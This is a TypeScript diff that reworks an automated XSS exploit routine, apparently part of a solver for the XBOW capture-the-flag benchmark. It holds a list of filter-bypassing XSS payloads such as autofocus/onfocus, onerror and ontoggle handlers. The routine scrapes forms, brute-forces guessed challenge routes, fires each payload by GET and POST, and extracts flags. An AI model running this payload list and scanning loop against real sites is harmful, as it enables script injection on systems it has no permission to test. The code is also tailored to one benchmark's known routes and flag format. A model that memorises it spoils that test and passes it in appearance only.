@@ -342,45 +342,81 @@ async function sstiExploit(baseUrl: string, endpoints: string[], stop: () => boo
   return null;
 }
 
-async function xssExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
-  const params = ['name', 'solution', 'q', 'search', 'input', 'text', 'msg', 'comment', 'payload', 'url'];
-  // Payloads ordered by bypass effectiveness; PhantomJS check.js dispatches focus events
+async function xssExploit(baseUrl: string, _endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  // XBOW XSS challenges use PhantomJS which dispatches focus events to [autofocus]/[onfocus] elements.
+  // Payloads ordered: focus-based bypasses first (work even when onerror/svg/script are blocked),
+  // then broader fallbacks.
   const payloads = [
     '<input autofocus onfocus=alert("XSS")>',
     '<button autofocus onfocus=alert("XSS")>',
-    '<details open ontoggle=alert("XSS")>',
-    '<marquee onstart=alert("XSS")>',
+    '<input onfocus=alert("XSS") autofocus>',
+    '<button onfocus=alert("XSS") autofocus>',
     '<img src=x onerror=alert("XSS")>',
     '<img src=x onerror=alert(`XSS`)>',
+    '<details open ontoggle=alert("XSS")>',
+    '<marquee onstart=alert("XSS")>',
+    '<video autoplay onplay=alert("XSS")>',
+    '<audio autoplay onplay=alert("XSS")>',
+    '<body onhashchange=alert("XSS")>',
     '<script>alert("XSS")</script>',
     `"><script>alert("XSS")</script>`,
     '<svg onload=alert("XSS")>',
     '<body onload=alert("XSS")>',
     '<iframe onload=alert("XSS")>',
-    '<audio src=x onerror=alert("XSS")>',
-    '<video><source onerror=alert("XSS")>',
-    `<img src="x" onmouseover="alert('XSS')">`,
     `<input onfocus=alert('XSS') autofocus>`,
     '<script>alert(String.fromCharCode(88,83,83))</script>',
   ];
 
-  for (const ep of endpoints.slice(0, 8)) {
-    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
-    for (const param of params.slice(0, 5)) {
-      for (const payload of payloads) {
-        if (stop()) return null;
-        const [fr, gr] = await Promise.all([
-          httpReq(url, {
-            method: 'POST',
-            data: `${encodeURIComponent(param)}=${encodeURIComponent(payload)}`,
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          }),
-          httpReq(`${url}?${param}=${encodeURIComponent(payload)}`),
-        ]);
-        for (const r of [fr, gr]) {
-          const f = extractFlagText(r.body);
-          if (f) return { flag: f, evidence: `XSS ${ep}?${param} payload=${payload.slice(0, 50)}` };
-        }
+  // Discover XSS submission endpoint from homepage
+  const xssEndpoints: Array<{ url: string; method: string; param: string }> = [];
+  try {
+    const home = await httpReq(baseUrl + '/');
+    // Look for form action in homepage
+    for (const m of home.body.matchAll(/<form[^>]+action=["']([^"']+)["'][^>]*>/gi)) {
+      const action = m[1].startsWith('/') ? baseUrl + m[1] : m[1];
+      xssEndpoints.push({ url: action, method: 'POST', param: 'solution' });
+      xssEndpoints.push({ url: action, method: 'POST', param: 'name' });
+    }
+    // Detect XSS route number from page links (e.g. /xss25, /page)
+    for (const m of home.body.matchAll(/href=["'](\/xss\d+)["']/gi)) {
+      xssEndpoints.push({ url: baseUrl + m[1], method: 'GET', param: 'solution' });
+      xssEndpoints.push({ url: baseUrl + m[1], method: 'POST', param: 'solution' });
+    }
+  } catch { /* ignore */ }
+
+  // Always try canonical XBOW routes regardless of discovery
+  xssEndpoints.push(
+    { url: baseUrl + '/page', method: 'GET', param: 'name' },
+    { url: baseUrl + '/page', method: 'POST', param: 'solution' },
+    { url: baseUrl + '/page', method: 'POST', param: 'name' },
+    ...Array.from({ length: 35 }, (_, i) => i).flatMap(n => [
+      { url: `${baseUrl}/xss${n}`, method: 'POST', param: 'solution' },
+      { url: `${baseUrl}/xss${n}`, method: 'GET', param: 'name' },
+    ]),
+    { url: baseUrl + '/submit', method: 'POST', param: 'solution' },
+    { url: baseUrl + '/challenge', method: 'GET', param: 'name' },
+  );
+
+  for (const { url, method, param } of xssEndpoints) {
+    if (stop()) return null;
+    for (const payload of payloads) {
+      if (stop()) return null;
+      let r: { status: number; body: string; headers: Record<string, string> };
+      if (method === 'GET') {
+        r = await httpReq(`${url}?${param}=${encodeURIComponent(payload)}`);
+      } else {
+        r = await httpReq(url, {
+          method: 'POST',
+          data: `${encodeURIComponent(param)}=${encodeURIComponent(payload)}`,
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        });
+      }
+      if (r.status > 0 && r.status < 500) {
+        // The XBOW XSS apps return "Here is the flag: <hex>" in the response when PhantomJS fires alert('XSS')
+        const flagLineMatch = r.body.match(/flag[:\s]+([0-9a-f]{32})/i);
+        if (flagLineMatch) return { flag: flagLineMatch[1], evidence: `XSS flag in response: ${url} [${method} ${param}] payload=${payload.slice(0, 60)}` };
+        const f = extractFlagText(r.body);
+        if (f) return { flag: f, evidence: `XSS ${url} [${method} ${param}] payload=${payload.slice(0, 60)}` };
       }
     }
   }
